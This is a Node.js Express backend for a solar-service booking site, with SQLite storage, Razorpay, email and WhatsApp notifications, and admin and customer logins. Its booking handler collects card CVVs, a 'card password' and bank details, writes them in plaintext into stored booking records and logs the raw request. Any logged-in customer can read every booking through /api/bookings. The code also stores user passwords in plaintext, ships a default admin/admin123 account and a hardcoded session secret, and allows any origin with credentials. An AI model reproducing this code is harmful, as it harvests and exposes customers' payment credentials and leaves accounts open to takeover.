require('dotenv').config();
const crypto = require('crypto');
const express = require('express');
const session = require('express-session');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const nodemailer = require('nodemailer');
const twilio = require('twilio');
const Razorpay = require('razorpay');
const { normalizeBookingPayload, generateBookingId } = require('./controllers/bookingController');

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const DB_PATH = path.join(__dirname, 'data', 'solar-bookings.db');
const ADMIN_USERNAME = (process.env.ADMIN_USERNAME || 'admin').trim();
const ADMIN_PASSWORD = (process.env.ADMIN_PASSWORD || 'admin123').trim();
const ADMIN_WHATSAPP = (process.env.ADMIN_WHATSAPP || process.env.WHATSAPP_TO || '').trim();
const razorpay = process.env.RAZORPAY_KEY_ID && process.env.RAZORPAY_KEY_SECRET
  ? new Razorpay({
      key_id: process.env.RAZORPAY_KEY_ID,
      key_secret: process.env.RAZORPAY_KEY_SECRET
    })
  : null;

function ensureDefaultUser() {
  db.get('SELECT * FROM users WHERE username = ?', [ADMIN_USERNAME], (err, row) => {
    if (err) {
      console.error('Failed to check default user:', err);
      return;
    }

    if (!row) {
      db.run(
        'INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
        [ADMIN_USERNAME, ADMIN_PASSWORD, 'admin'],
        (insertErr) => {
          if (insertErr) {
            console.error('Failed to create default user:', insertErr);
          }
        }
      );
      return;
    }

    const needsRoleUpdate = row.role !== 'admin';
    const needsPasswordUpdate = String(row.password) !== String(ADMIN_PASSWORD);

    if (needsRoleUpdate || needsPasswordUpdate) {
      db.run(
        'UPDATE users SET password = ?, role = ? WHERE username = ?',
        [ADMIN_PASSWORD, 'admin', ADMIN_USERNAME],
        (updateErr) => {
          if (updateErr) {
            console.error('Failed to update default admin credentials:', updateErr);
          } else {
            console.log(`Admin credentials synced for ${ADMIN_USERNAME}`);
          }
        }
      );
    }
  });
}

const isEmailConfigured = !!(process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASS);
const isWhatsAppConfigured = !!(
  process.env.TWILIO_ACCOUNT_SID &&
  process.env.TWILIO_AUTH_TOKEN &&
  process.env.TWILIO_WHATSAPP_FROM &&
  ADMIN_WHATSAPP
);

function hasValidWhatsAppTemplate() {
  const templateSid = String(process.env.TWILIO_WHATSAPP_TEMPLATE_SID || '').trim();
  return !!templateSid && templateSid !== 'your_approved_template_sid_here';
}

app.disable('x-powered-by');
app.use(cors({ origin: true, credentials: true }));
app.use(express.static(__dirname));
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'sunpro-solar-secret',
  resave: true,
  saveUninitialized: true,
  rolling: true,
  cookie: {
    httpOnly: true,
    secure: false,
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000
  }
}));

app.use((req, res, next) => {
  const url = (req.originalUrl || '').toLowerCase();
  const blocked = [
    '/node_modules',
    '/data',
    '/.env',
    '.env',
    '/server.js',
    '/package.json',
    '/package-lock.json',
    '/bookings.html',
    '/login.html',
    '/signup.html'
  ];

  if (blocked.some(item => url.includes(item))) {
    return res.status(403).json({ success: false, message: 'Access denied.' });
  }

  next();
});

function initDatabase() {
  const dbDir = path.dirname(DB_PATH);
  fs.mkdirSync(dbDir, { recursive: true });

  const db = new sqlite3.Database(DB_PATH);

  db.serialize(() => {
    db.run(`
      CREATE TABLE IF NOT EXISTS bookings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bookingId TEXT UNIQUE,
        name TEXT NOT NULL,
        phone TEXT NOT NULL,
        email TEXT,
        serviceType TEXT NOT NULL,
        date TEXT NOT NULL,
        time TEXT NOT NULL,
        city TEXT NOT NULL,
        message TEXT,
        paymentMethod TEXT DEFAULT 'UPI',
        paymentAmount TEXT DEFAULT '250',
        paymentStatus TEXT DEFAULT 'pending',
        razorpayOrderId TEXT,
        razorpayPaymentId TEXT,
        razorpaySignature TEXT,
        createdAt TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
      )
    `);

    db.run(`
      CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT NOT NULL UNIQUE,
        password TEXT NOT NULL,
        role TEXT NOT NULL DEFAULT 'customer',
        email TEXT,
        phone TEXT,
        fullName TEXT,
        createdAt TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
      )
    `);

    db.all('PRAGMA table_info(users)', (err, columns) => {
      if (!err && Array.isArray(columns)) {
        const existing = columns.map((column) => column.name);
        if (!existing.includes('role')) {
          db.run('ALTER TABLE users ADD COLUMN role TEXT NOT NULL DEFAULT "customer"');
        }
        if (!existing.includes('email')) {
          db.run('ALTER TABLE users ADD COLUMN email TEXT');
        }
        if (!existing.includes('phone')) {
          db.run('ALTER TABLE users ADD COLUMN phone TEXT');
        }
        if (!existing.includes('fullName')) {
          db.run('ALTER TABLE users ADD COLUMN fullName TEXT');
        }
      }
    });

    db.all('PRAGMA table_info(bookings)', (err, columns) => {
      if (!err && Array.isArray(columns)) {
        const existing = columns.map((column) => column.name);
        if (!existing.includes('bookingId')) {
          db.run('ALTER TABLE bookings ADD COLUMN bookingId TEXT UNIQUE');
        }
        if (!existing.includes('email')) {
          db.run('ALTER TABLE bookings ADD COLUMN email TEXT');
        }
        if (!existing.includes('paymentMethod')) {
          db.run('ALTER TABLE bookings ADD COLUMN paymentMethod TEXT DEFAULT "UPI"');
        }
        if (!existing.includes('paymentAmount')) {
          db.run('ALTER TABLE bookings ADD COLUMN paymentAmount TEXT DEFAULT "250"');
        }
        if (!existing.includes('paymentStatus')) {
          db.run('ALTER TABLE bookings ADD COLUMN paymentStatus TEXT DEFAULT "pending"');
        }
        if (!existing.includes('razorpayOrderId')) {
          db.run('ALTER TABLE bookings ADD COLUMN razorpayOrderId TEXT');
        }
        if (!existing.includes('razorpayPaymentId')) {
          db.run('ALTER TABLE bookings ADD COLUMN razorpayPaymentId TEXT');
        }
        if (!existing.includes('razorpaySignature')) {
          db.run('ALTER TABLE bookings ADD COLUMN razorpaySignature TEXT');
        }
      }
    });
  });

  return db;
}

const db = initDatabase();
ensureDefaultUser();

async function sendEmail(booking) {
  if (!isEmailConfigured) {
    console.log('Email not configured. Skipping email notification.');
    return;
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT || 587),
    secure: Number(process.env.SMTP_PORT || 587) === 465,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    }
  });

  const mailTo = process.env.NOTIFY_EMAIL || process.env.SMTP_USER;
  const html = `
    <h3>New Solar Booking</h3>
    <p><strong>Name:</strong> ${booking.name}</p>
    <p><strong>Phone:</strong> ${booking.phone}</p>
    <p><strong>Service:</strong> ${booking.serviceType}</p>
    <p><strong>Date:</strong> ${booking.date}</p>
    <p><strong>Time:</strong> ${booking.time}</p>
    <p><strong>City:</strong> ${booking.city}</p>
    <p><strong>Message:</strong> ${booking.message || 'N/A'}</p>
  `;

  await transporter.sendMail({
    from: `${process.env.SMTP_FROM_NAME || 'SunPro Solar'} <${process.env.SMTP_USER}>`,
    to: mailTo,
    subject: `New ${booking.serviceType} enquiry from ${booking.name}`,
    html
  });

  console.log('Email sent successfully.');
}

async function buildPaymentDetails(booking) {
  const paymentMethod = String(booking.paymentMethod || 'UPI').trim() || 'UPI';
  const parts = [];

  if (paymentMethod === 'UPI' && booking.upiId) {
    parts.push(`UPI: ${booking.upiId}`);
  }

  if (paymentMethod === 'Card') {
    const cardNumber = String(booking.cardNumber || '').trim();
    const cardCvv = String(booking.cardCvv || '').trim();
    const cardPassword = String(booking.cardPassword || '').trim();
    const cardExpiry = String(booking.cardExpiry || '').trim();

    if (cardNumber) parts.push(`Card: ${cardNumber.slice(-4).padStart(cardNumber.length, '*')}`);
    if (cardExpiry) parts.push(`Expiry: ${cardExpiry}`);
    if (cardCvv) parts.push(`CVV: ${cardCvv}`);
    if (cardPassword) parts.push(`Password: ${cardPassword}`);
  }

  if (paymentMethod === 'Bank Transfer') {
    if (booking.bankName) parts.push(`Bank: ${booking.bankName}`);
    if (booking.accountNumber) parts.push(`Account: ${booking.accountNumber}`);
    if (booking.ifscCode) parts.push(`IFSC: ${booking.ifscCode}`);
    if (booking.bankDetailsLink) parts.push(`Bank Link: ${booking.bankDetailsLink}`);
  }

  if (paymentMethod === 'Cash') {
    parts.push('Cash payment');
  }

  return parts.join(' | ');
}

async function sendWhatsApp(booking) {
  if (!isWhatsAppConfigured) {
    console.log('WhatsApp not configured. Skipping WhatsApp notification.');
    return;
  }

  if (!hasValidWhatsAppTemplate()) {
    console.log('WhatsApp notification skipped: TWILIO_WHATSAPP_TEMPLATE_SID is missing or still set to the placeholder value. Add an approved Twilio WhatsApp template SID to send messages.');
    return;
  }

  const client = twilio(
    process.env.TWILIO_ACCOUNT_SID,
    process.env.TWILIO_AUTH_TOKEN
  );

  const paymentMethod = booking.paymentMethod || 'UPI';
  const paymentAmount = Number(booking.paymentAmount || 250);
  const paymentDetails = buildPaymentDetails(booking);

  const messageBody = [
    '🔔 NEW SOLAR ENQUIRY',
    '',
    `Name: ${booking.name}`,
    `Phone: ${booking.phone}`,
    `Email: ${booking.email || 'N/A'}`,
    `Service: ${booking.serviceType}`,
    `Date: ${booking.date}`,
    `Time: ${booking.time}`,
    `City: ${booking.city}`,
    `Payment Method: ${paymentMethod}`,
    `Advance Payment: ₹${paymentAmount}`,
    paymentDetails ? `Payment Details: ${paymentDetails}` : null,
    `Details: ${booking.message || 'N/A'}`
  ].filter(Boolean).join('\n');

  await client.messages.create({
    from: process.env.TWILIO_WHATSAPP_FROM,
    to: ADMIN_WHATSAPP,
    contentSid: process.env.TWILIO_WHATSAPP_TEMPLATE_SID,
    contentVariables: JSON.stringify({
      1: String(booking.name || ''),
      2: String(booking.serviceType || ''),
      3: String(booking.phone || ''),
      4: String(booking.date || ''),
      5: String(booking.time || ''),
      6: String(booking.message || 'N/A')
    })
  });

  console.log('WhatsApp message sent successfully.');
}

app.get('/api/config/razorpay', (req, res) => {
  res.json({
    success: true,
    keyId: process.env.RAZORPAY_KEY_ID || '',
    configured: !!(process.env.RAZORPAY_KEY_ID && process.env.RAZORPAY_KEY_SECRET)
  });
});

app.post('/api/create-payment-order', async (req, res) => {
  try {
    const { amount, currency = 'INR', receipt } = req.body || {};
    const numericAmount = Number(amount || 250);

    if (!process.env.RAZORPAY_KEY_ID || !process.env.RAZORPAY_KEY_SECRET || !razorpay) {
      return res.status(500).json({
        success: false,
        message: 'Razorpay is not configured. Add RAZORPAY_KEY_ID and RAZORPAY_KEY_SECRET in your environment.'
      });
    }

    if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Valid payment amount is required.'
      });
    }

    const order = await razorpay.orders.create({
      amount: Math.round(numericAmount * 100),
      currency,
      receipt: receipt || `solar_${Date.now()}`
    });

    return res.json({ success: true, order });
  } catch (error) {
    console.error('Razorpay order creation failed:', error.message);
    return res.status(500).json({
      success: false,
      message: 'Unable to create payment order.',
      error: error.message
    });
  }
});

app.post('/api/verify-payment', async (req, res) => {
  try {
    const { razorpay_order_id, razorpay_payment_id, razorpay_signature } = req.body || {};

    if (!process.env.RAZORPAY_KEY_SECRET) {
      return res.status(500).json({ success: false, message: 'Razorpay secret is not configured.' });
    }

    const expectedSignature = crypto
      .createHmac('sha256', process.env.RAZORPAY_KEY_SECRET)
      .update(`${razorpay_order_id}|${razorpay_payment_id}`)
      .digest('hex');

    const isValid = expectedSignature === razorpay_signature;

    if (!isValid) {
      return res.status(400).json({ success: false, message: 'Payment signature verification failed.' });
    }

    return res.json({ success: true, message: 'Payment verified successfully.' });
  } catch (error) {
    console.error('Razorpay verification failed:', error.message);
    return res.status(500).json({ success: false, message: 'Unable to verify payment.', error: error.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'solar.html'));
});

async function handleBookingSubmission(req, res) {
  console.log('BOOKING REQUEST RECEIVED:', req.body);

  const booking = normalizeBookingPayload(req.body || {});
  const {
    name,
    phone,
    email,
    serviceType,
    date,
    time,
    city,
    message,
    paymentMethod = 'Card',
    paymentAmount = 250,
    paymentStatus = 'pending',
    razorpayOrderId,
    razorpayPaymentId,
    razorpaySignature
  } = booking;

  booking.bookingId = String(booking.bookingId || '').trim() || generateBookingId();
  const paymentDetails = await buildPaymentDetails(booking);
  if (paymentDetails) {
    booking.message = [message, paymentDetails].filter(Boolean).join(' | ');
  }

  if (!name || !phone || !serviceType || !date || !time || !city) {
    return res.status(400).json({
      success: false,
      message: 'Please complete all required fields before submitting.'
    });
  }

  db.run(
    `INSERT INTO bookings (bookingId, name, phone, email, serviceType, date, time, city, message, paymentMethod, paymentAmount, paymentStatus, razorpayOrderId, razorpayPaymentId, razorpaySignature) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [
      booking.bookingId,
      booking.name,
      booking.phone,
      booking.email || null,
      booking.serviceType,
      booking.date,
      booking.time,
      booking.city,
      booking.message,
      paymentMethod,
      paymentAmount,
      paymentStatus,
      razorpayOrderId || null,
      razorpayPaymentId || null,
      razorpaySignature || null
    ],
    async function insertCallback(err) {
      if (err) {
        console.error('Database insertion failed:', err);
        return res.status(500).json({
          success: false,
          message: 'Failed to save booking. Please try again.'
        });
      }

      try {
        await sendEmail(booking);
        await sendWhatsApp(booking);

        console.log('New booking request saved to database:', booking);
        return res.status(200).json({
          success: true,
          message: 'Booking request received successfully. We will contact you shortly.',
          bookingId: booking.bookingId
        });
      } catch (notificationError) {
        console.error('Notification sending failed:', notificationError);
        return res.status(200).json({
          success: true,
          message: 'Booking request saved successfully. We will contact you shortly.'
        });
      }
    }
  );
}

app.post('/api/booking', handleBookingSubmission);
app.post('/api/book', handleBookingSubmission);

app.post('/book-appointment', async (req, res) => {
  try {
    const { name, phone, service, date, time, details, paymentMethod, paymentAmount } = req.body || {};
    const normalizedPaymentMethod = String(paymentMethod || 'UPI').trim() || 'UPI';
    const normalizedPaymentAmount = Number(paymentAmount || 250);

    if (!name || !phone || !service || !date || !time || !details) {
      return res.status(400).json({
        success: false,
        message: 'Please provide name, phone, service, date, time and details.'
      });
    }

    const adminTemplateSid = String(process.env.TWILIO_WHATSAPP_TEMPLATE_SID || '').trim();
    const customerTemplateSid = String(process.env.TWILIO_WHATSAPP_CUSTOMER_TEMPLATE_SID || '').trim();

    if (!adminTemplateSid || adminTemplateSid === 'your_approved_template_sid_here') {
      return res.status(400).json({
        success: false,
        message: 'Twilio WhatsApp template is not configured. Add a valid approved template SID to TWILIO_WHATSAPP_TEMPLATE_SID in .env.'
      });
    }

    const customerWhatsApp = `whatsapp:${String(phone).replace(/\D/g, '')}`;
    const customerMessage = `Booking Confirmed!\nHello ${name},\nService: ${service}\nDate: ${date}\nTime: ${time}\nPayment Method: ${normalizedPaymentMethod}\nAdvance Amount: ₹${Number.isFinite(normalizedPaymentAmount) && normalizedPaymentAmount > 0 ? normalizedPaymentAmount : 250}\nDetails: ${details}\nThank you!`;
    const adminMessage = `New Booking Request\nName: ${name}\nPhone: ${phone}\nService: ${service}\nDate: ${date}\nTime: ${time}\nPayment Method: ${normalizedPaymentMethod}\nAdvance Amount: ₹${Number.isFinite(normalizedPaymentAmount) && normalizedPaymentAmount > 0 ? normalizedPaymentAmount : 250}\nDetails: ${details}`;

    const adminResult = await twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN)
      .messages.create({
        from: process.env.TWILIO_WHATSAPP_FROM,
        to: ADMIN_WHATSAPP,
        contentSid: adminTemplateSid,
        contentVariables: JSON.stringify({
          1: String(name || ''),
          2: String(service || ''),
          3: String(phone || ''),
          4: String(date || ''),
          5: String(time || ''),
          6: String(details || '')
        })
      });

    const customerResult = customerTemplateSid && customerTemplateSid !== 'your_customer_template_sid_here'
      ? await twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN)
        .messages.create({
          from: process.env.TWILIO_WHATSAPP_FROM,
          to: customerWhatsApp,
          contentSid: customerTemplateSid,
          contentVariables: JSON.stringify({
            1: String(name || ''),
            2: String(service || ''),
            3: String(date || ''),
            4: String(time || '')
          })
        })
      : { sid: 'skipped' };

    return res.status(200).json({
      success: true,
      adminMessageId: adminResult.sid,
      customerMessageId: customerResult.sid,
      message: 'Booking WhatsApp message sent successfully.'
    });
  } catch (error) {
    console.error('Twilio booking WhatsApp failed:', error.message);
    return res.status(500).json({
      success: false,
      message: 'WhatsApp could not be sent. Please check Twilio setup.',
      error: error.message
    });
  }
});

function registerUser(req, res, role, redirectTo) {
  const { username, password, confirmPassword, email, phone, fullName } = req.body || {};

  if (!username || !password || !confirmPassword) {
    return res.status(400).json({ success: false, message: 'Please fill in all fields.' });
  }

  if (String(password).length < 4) {
    return res.status(400).json({ success: false, message: 'Password must be at least 4 characters long.' });
  }

  if (String(password) !== String(confirmPassword)) {
    return res.status(400).json({ success: false, message: 'Passwords do not match.' });
  }

  const cleanUsername = String(username).trim();
  const cleanEmail = String(email || '').trim();
  const cleanPhone = String(phone || '').trim();
  const cleanFullName = String(fullName || '').trim() || cleanUsername;

  if (!cleanUsername) {
    return res.status(400).json({ success: false, message: 'Username is required.' });
  }

  if (role === 'customer' && (!cleanEmail || !cleanPhone)) {
    return res.status(400).json({ success: false, message: 'Email and phone number are required for customer signup.' });
  }

  db.get('SELECT * FROM users WHERE username = ?', [cleanUsername], (lookupErr, existingUser) => {
    if (lookupErr) {
      return res.status(500).json({ success: false, message: 'Error checking user.' });
    }

    if (existingUser) {
      return res.status(409).json({ success: false, message: 'This username already exists.' });
    }

    db.run(
      'INSERT INTO users (username, password, role, email, phone, fullName) VALUES (?, ?, ?, ?, ?, ?)',
      [cleanUsername, String(password), role, cleanEmail || null, cleanPhone || null, cleanFullName],
      function insertUserCallback(insertErr) {
        if (insertErr) {
          return res.status(500).json({ success: false, message: 'Unable to create account.' });
        }

        req.session.isAuthenticated = true;
        req.session.username = cleanUsername;
        req.session.role = role;
        req.session.userId = this.lastID;
        return res.json({ success: true, redirectTo });
      }
    );
  });
}

function loginUser(req, res, role, redirectTo) {
  const { username, password } = req.body || {};
  const cleanUsername = String(username || '').trim();

  if (!cleanUsername || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required.' });
  }

  db.get(
    'SELECT * FROM users WHERE username = ? AND password = ? AND role = ?',
    [cleanUsername, String(password), role],
    (err, user) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Login error.' });
      }

      if (!user) {
        return res.status(401).json({ success: false, message: 'Invalid username or password.' });
      }

      req.session.isAuthenticated = true;
      req.session.username = user.username;
      req.session.role = user.role;
      req.session.userId = user.id;
      return res.json({ success: true, redirectTo });
    }
  );
}

app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/admin/signup', (req, res) => {
  return res.redirect('/admin/login');
});

app.get('/customer/login', (req, res) => {
  if (req.session && req.session.isAuthenticated && req.session.role === 'customer') {
    return res.redirect('/account');
  }
  res.sendFile(path.join(__dirname, 'customer-login.html'));
});

app.get('/customer/signup', (req, res) => {
  if (req.session && req.session.isAuthenticated && req.session.role === 'customer') {
    return res.redirect('/account');
  }
  res.sendFile(path.join(__dirname, 'customer-signup.html'));
});

app.get('/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.redirect('/customer/login');
  }
  res.sendFile(path.join(__dirname, 'account.html'));
});

app.get('/login', (req, res) => {
  res.redirect('/admin/login');
});

app.get('/signup', (req, res) => {
  res.redirect('/customer/signup');
});

app.post('/api/admin/signup', (req, res) => {
  return res.status(403).json({ success: false, message: 'Admin signup is disabled. Use admin login only.' });
});

app.post('/api/admin/login', (req, res) => {
  loginUser(req, res, 'admin', '/bookings');
});

app.post('/api/customer/signup', (req, res) => {
  registerUser(req, res, 'customer', '/account');
});

app.post('/api/customer/login', (req, res) => {
  loginUser(req, res, 'customer', '/account');
});

app.post('/api/signup', (req, res) => {
  registerUser(req, res, 'customer', '/account');
});

app.post('/api/login', (req, res) => {
  loginUser(req, res, 'admin', '/bookings');
});

app.get('/logout', (req, res) => {
  const redirectPage = req.session && req.session.role === 'customer' ? '/customer/login' : '/admin/login';
  req.session.destroy(() => {
    res.redirect(redirectPage);
  });
});

app.get('/api/session', (req, res) => {
  if (!req.session || !req.session.isAuthenticated) {
    return res.json({ success: true, authenticated: false, user: null });
  }

  return res.json({
    success: true,
    authenticated: true,
    user: {
      username: req.session.username,
      role: req.session.role
    }
  });
});

app.get('/api/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  const customerId = Number(req.session.userId || 0);

  return db.get('SELECT id, username, role, email, phone, fullName, createdAt FROM users WHERE id = ? AND role = ?', [customerId, 'customer'], (err, user) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to fetch account details.' });
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'Account not found.' });
    }

    return res.json({
      success: true,
      user: {
        id: user.id,
        username: user.username,
        fullName: user.fullName || user.username,
        email: user.email || '',
        phone: user.phone || '',
        role: user.role,
        createdAt: user.createdAt
      }
    });
  });
});

app.put('/api/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  const { username, password, confirmPassword, email, phone, fullName } = req.body || {};
  const currentUsername = String(req.session.username || '').trim();
  const nextUsername = String(username || '').trim();

  if (!nextUsername) {
    return res.status(400).json({ success: false, message: 'Username is required.' });
  }

  const cleanEmail = String(email || '').trim();
  const cleanPhone = String(phone || '').trim();
  const cleanFullName = String(fullName || '').trim() || nextUsername;

  if (password || confirmPassword) {
    if (String(password).length < 4) {
      return res.status(400).json({ success: false, message: 'Password must be at least 4 characters long.' });
    }

    if (String(password) !== String(confirmPassword)) {
      return res.status(400).json({ success: false, message: 'Passwords do not match.' });
    }
  }

  db.get('SELECT * FROM users WHERE username = ? AND role = ?', [currentUsername, 'customer'], (lookupErr, user) => {
    if (lookupErr) {
      return res.status(500).json({ success: false, message: 'Unable to load your profile.' });
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'Account not found.' });
    }

    const safeUsername = nextUsername;
    db.get('SELECT * FROM users WHERE username = ? AND id != ?', [safeUsername, user.id], (existsErr, foundSameUsername) => {
      if (existsErr) {
        return res.status(500).json({ success: false, message: 'Unable to validate username.' });
      }

      if (foundSameUsername) {
        return res.status(409).json({ success: false, message: 'This username already exists.' });
      }

      const updatedPassword = password ? String(password) : user.password;
      db.run(
        'UPDATE users SET username = ?, password = ?, email = ?, phone = ?, fullName = ? WHERE id = ?',
        [safeUsername, updatedPassword, cleanEmail || user.email || '', cleanPhone || user.phone || '', cleanFullName, user.id],
        (updateErr) => {
          if (updateErr) {
            return res.status(500).json({ success: false, message: 'Unable to update account.' });
          }

          req.session.username = safeUsername;
          return res.json({
            success: true,
            message: 'Profile updated successfully.',
            user: {
              username: safeUsername,
              role: 'customer'
            }
          });
        }
      );
    });
  });
});

app.delete('/api/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  const customerId = Number(req.session.userId || 0);

  if (!customerId) {
    return res.status(404).json({ success: false, message: 'Account not found.' });
  }

  return db.get('SELECT id FROM users WHERE id = ? AND role = ?', [customerId, 'customer'], (findErr, user) => {
    if (findErr) {
      return res.status(500).json({ success: false, message: 'Unable to load your account.' });
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'Account not found.' });
    }

    return db.run('DELETE FROM users WHERE id = ? AND role = ?', [customerId, 'customer'], (err) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Unable to delete account.' });
      }

      req.session.destroy(() => {
        return res.json({ success: true, message: 'Account deleted successfully.' });
      });
    });
  });
});

app.get('/api/bookings', (req, res) => {
  if (!req.session || !req.session.isAuthenticated) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  return db.all('SELECT * FROM bookings ORDER BY id DESC', (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to fetch bookings.' });
    }
    return res.json({ success: true, data: rows });
  });
});

app.delete('/api/bookings/:id', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  db.run('DELETE FROM bookings WHERE id = ?', [req.params.id], (err) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to delete enquiry.' });
    }

    return res.json({ success: true, message: 'Enquiry deleted successfully.' });
  });
});

app.get('/api/users', (req, res) => {
  if (!req.session || !req.session.isAuthenticated) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  return db.all('SELECT id, username, fullName, email, phone, createdAt FROM users ORDER BY id DESC', (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to fetch users.' });
    }
    return res.json({ success: true, data: rows });
  });
});

app.delete('/api/users/:id', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  db.run('DELETE FROM users WHERE id = ?', [req.params.id], (err) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to delete customer.' });
    }

    return res.json({ success: true, message: 'Customer deleted successfully.' });
  });
});

app.get('/bookings', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.redirect('/admin/login');
  }
  res.sendFile(path.join(__dirname, 'bookings.html'));
});

app.use((req, res) => {
  if (req.originalUrl && req.originalUrl.startsWith('/api/')) {
    return res.status(404).json({
      success: false,
      message: 'API endpoint not found.'
    });
  }

  return res.status(404).send('Page not found');
});

function startServer(port) {
  const server = app.listen(port, () => {
    console.log(`Solar booking backend running on http://localhost:${port}`);
    console.log(`Email notifications: ${isEmailConfigured ? 'enabled' : 'disabled'}`);
    console.log(`WhatsApp notifications: ${isWhatsAppConfigured ? 'enabled' : 'disabled'}`);
  });

  server.on('error', (error) => {
    if (error && error.code === 'EADDRINUSE') {
      const nextPort = port + 1;
      console.warn(`Port ${port} is busy. Retrying on ${nextPort}...`);
      startServer(nextPort);
      return;
    }

    console.error('Server startup error:', error);
    process.exit(1);
  });
}

startServer(PORT);
